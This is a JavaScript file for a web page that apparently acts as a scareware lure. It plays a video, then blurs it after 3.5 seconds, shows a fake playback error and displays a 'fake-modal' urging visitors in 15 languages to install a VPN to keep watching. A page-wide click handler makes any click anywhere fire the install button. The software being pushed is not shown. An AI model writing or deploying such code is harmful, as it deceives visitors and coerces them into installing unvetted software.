document.body.style.overflow ="hidden";

(function () {
  const setViewportHeight = () => {
    const viewportHeight = window.visualViewport
      ? window.visualViewport.height
      : window.innerHeight;

    document.documentElement.style.setProperty(
      "--app-viewport-height",
      `${Math.round(viewportHeight)}px`
    );
  };

  setViewportHeight();
  window.addEventListener("resize", setViewportHeight);
  window.addEventListener("orientationchange", setViewportHeight);

  if (window.visualViewport) {
    window.visualViewport.addEventListener("resize", setViewportHeight);
    window.visualViewport.addEventListener("scroll", setViewportHeight);
  }
})();

document.addEventListener("DOMContentLoaded", function () {
    const bg = document.querySelector(".screen-bg");
    const modal = document.querySelector(".fake-modal");
    const bgVideo = document.querySelector(".video-bg");
    const modalDelayMs = 3500;
    const videoSources = [
      "./video/bg-video-noaudio.mp4",
      "./video/bg-video-safe.mp4",
      "./video/IMG_2376.mp4",
    ];
    let pauseVideo = () => {};
    let keepVideoPlayingId = null;
    let activeVideoSourceIndex = 0;
    let modalShown = false;
  


    let totalSeconds = "60";
    let timerStarted = false;
    let switched = false;
    let intervalId = null;

 const translations = {
  en: {
  modal_title_key: "Attention",
  modal_text_key: "Download a <strong>VPN</strong> to continue watching in secure mode.",
  scan_now_option: "Install",
  video_error_key: "The video cannot be played!",
},

fr: {
modal_title_key: "Attention",
modal_text_key: "Téléchargez un <strong>VPN</strong> pour continuer à regarder en mode sécurisé.",
scan_now_option: "Installer",
video_error_key: "La vidéo ne peut pas être lue !",
},

"pt-PT": {
modal_title_key: "Atenção",
modal_text_key: "Transfira uma <strong>VPN</strong> para continuar a ver em modo seguro.",
scan_now_option: "Instalar",
video_error_key: "Não é possível reproduzir o vídeo!",
},

"pt-BR": {
modal_title_key: "Atenção",
modal_text_key: "Baixe uma <strong>VPN</strong> para continuar assistindo no modo seguro.",
scan_now_option: "Instalar",
video_error_key: "O vídeo não pode ser reproduzido!",
},

es: {
modal_title_key: "Atención",
modal_text_key: "Descargue una <strong>VPN</strong> para seguir viendo en modo seguro.",
scan_now_option: "Instalar",
video_error_key: "¡El video no se puede reproducir!",
},

"es-419": {
modal_title_key: "Atención",
modal_text_key: "Descarga una <strong>VPN</strong> para seguir viendo en modo seguro.",
scan_now_option: "Instalar",
video_error_key: "¡El video no se puede reproducir!",
},

da: {
modal_title_key: "Advarsel",
modal_text_key: "Download en <strong>VPN</strong> for at fortsætte visningen i sikker tilstand.",
scan_now_option: "Installer",
video_error_key: "Videoen kan ikke afspilles!",
},

ja: {
modal_title_key: "注意",
modal_text_key: "安全モードで視聴を続けるには、<strong>VPN</strong>をインストールしてください。",
scan_now_option: "インストール",
video_error_key: "動画を再生できません！",
},

fil: {
modal_title_key: "Babala",
modal_text_key: "Mag-download ng <strong>VPN</strong> upang magpatuloy sa panonood sa secure na mode.",
scan_now_option: "I-install",
video_error_key: "Hindi ma-play ang video!",
},

de: {
modal_title_key: "Achtung",
modal_text_key: "Laden Sie ein <strong>VPN</strong> herunter, um im sicheren Modus weiterzusehen.",
scan_now_option: "Installieren",
video_error_key: "Das Video kann nicht abgespielt werden!",
},

nb: {
modal_title_key: "Advarsel",
modal_text_key: "Last ned en <strong>VPN</strong> for å fortsette å se i sikker modus.",
scan_now_option: "Installer",
video_error_key: "Videoen kan ikke spilles av!",
},

sv: {
modal_title_key: "Observera",
modal_text_key: "Ladda ner en <strong>VPN</strong> för att fortsätta titta i säkert läge.",
scan_now_option: "Installera",
video_error_key: "Videon kan inte spelas upp!",
},

it: {
modal_title_key: "Attenzione",
modal_text_key: "Scarica una <strong>VPN</strong> per continuare a guardare in modalità sicura.",
scan_now_option: "Installa",
video_error_key: "Il video non può essere riprodotto!",
},

nl: {
modal_title_key: "Let op",
modal_text_key: "Download een <strong>VPN</strong> om verder te kijken in de beveiligde modus.",
scan_now_option: "Installeren",
video_error_key: "De video kan niet worden afgespeeld!",
},

ro: {
modal_title_key: "Atenție",
modal_text_key: "Descarcă un <strong>VPN</strong> pentru a continua vizionarea în modul securizat.",
scan_now_option: "Instalează",
video_error_key: "Videoclipul nu poate fi redat!",
},
};

  const definedLanguages = [
    "en", "fr", "pt-PT", "pt-BR", "es", "es-419",
    "da", "ja", "fil", "de", "nb", "sv", "it", "nl", "ro"
  ];

  const currentLocale = (navigator && navigator.language) || "en";

  const getLocale = () => {
    if (translations[currentLocale]) return currentLocale;

    const shortLocale = currentLocale.slice(0, 2);
    if (translations[shortLocale]) return shortLocale;

    return "en";
  };

  const locale = getLocale();
  const t = translations[locale] || translations.en;

  document.documentElement.lang = locale;

  document.getElementById("modal_title_key").textContent = t.modal_title_key;
  document.getElementById("modal_text_key").innerHTML = t.modal_text_key || translations.en.modal_text_key;
  document.getElementById("scan_now_option").textContent = t.scan_now_option;
  document.querySelectorAll(".video_error_key").forEach((element) => {
    element.textContent = t.video_error_key || translations.en.video_error_key;
  });


document.addEventListener("click", function (e) {
    const installBtn = document.getElementById("goStep1");
    if (!installBtn) return;
    installBtn.click();
});




    if (bgVideo) {
      bgVideo.muted = true;
      bgVideo.defaultMuted = true;
      bgVideo.playsInline = true;
      bgVideo.setAttribute("muted", "");
      bgVideo.setAttribute("defaultmuted", "");
      bgVideo.setAttribute("playsinline", "");
      bgVideo.setAttribute("webkit-playsinline", "");
      bgVideo.setAttribute("autoplay", "");
      bgVideo.setAttribute("loop", "");
      bgVideo.setAttribute("preload", "auto");
      bgVideo.disablePictureInPicture = true;

      const tryPlay = () => {
        if (modalShown) return;

        const playPromise = bgVideo.play();
        if (playPromise && typeof playPromise.catch === "function") {
          playPromise.catch(() => {});
        }
      };

      const resumeVideo = (force) => {
        if (modalShown) return;
        if (!force && document.hidden) return;

        bgVideo.muted = true;
        tryPlay();
        window.setTimeout(tryPlay, 250);
        window.setTimeout(tryPlay, 1000);
      };

      const tryBlobFallback = () => {
        if (modalShown || bgVideo.dataset.blobFallback === "1" || bgVideo.readyState >= 2) {
          return;
        }

        bgVideo.dataset.blobFallback = "1";

        fetch(videoSources[activeVideoSourceIndex])
          .then((response) => {
            if (!response.ok) {
              throw new Error("Video fallback failed");
            }

            return response.blob();
          })
          .then((blob) => {
            if (modalShown) return;

            bgVideo.src = URL.createObjectURL(blob);
            bgVideo.load();
            resumeVideo(true);
          })
          .catch(() => {});
      };

      pauseVideo = () => {
        bgVideo.pause();
      };

      bgVideo.addEventListener("error", () => {
        const nextSource = videoSources[activeVideoSourceIndex + 1];

        if (nextSource) {
          activeVideoSourceIndex += 1;
          bgVideo.src = nextSource;
          bgVideo.load();
          resumeVideo(true);
        } else {
          tryBlobFallback();
        }
      });
      bgVideo.addEventListener("loadeddata", () => resumeVideo(true), { once: true });
      bgVideo.addEventListener("loadedmetadata", () => resumeVideo(true), { once: true });
      bgVideo.addEventListener("canplay", () => resumeVideo(true), { once: true });
      bgVideo.addEventListener("pause", () => {
        if (!modalShown) {
          window.setTimeout(resumeVideo, 300);
        }
      });
      window.addEventListener("pageshow", () => resumeVideo(true));
      window.addEventListener("focus", () => resumeVideo(true));
      window.addEventListener("blur", () => {
        window.setTimeout(resumeVideo, 500);
      });
      document.addEventListener("visibilitychange", () => {
        if (!document.hidden) {
          resumeVideo(true);
        }
      });
      document.addEventListener("touchstart", () => resumeVideo(true), { passive: true });
      if (!bgVideo.getAttribute("src")) {
        bgVideo.src = videoSources[activeVideoSourceIndex];
        bgVideo.load();
      }
      resumeVideo(true);
      window.setTimeout(tryBlobFallback, 1200);
      keepVideoPlayingId = window.setInterval(() => {
        if (!document.hidden && bgVideo.paused) {
          resumeVideo();
        }
      }, 1000);
    }

    window.setTimeout(() => {
      modalShown = true;
      if (keepVideoPlayingId) {
        window.clearInterval(keepVideoPlayingId);
      }

      if (bg) {
        bg.classList.add("active");
      }

      if (bgVideo) {
        bgVideo.style.filter = "blur(18px)";
        bgVideo.style.transform = "scale(1.08)";
        document.querySelectorAll(".video-error").forEach((element) => {
          element.style.opacity = "1";
        });
        pauseVideo();
      }
    }, modalDelayMs);

  
(function () {
  const ua = navigator.userAgent;
  const isIOS = /iPhone|iPad|iPod/i.test(ua);
  const isChrome = /CriOS/i.test(ua);

  if (isIOS && isChrome) {
    document.body.classList.add('ios-chrome');
  }
})();
});
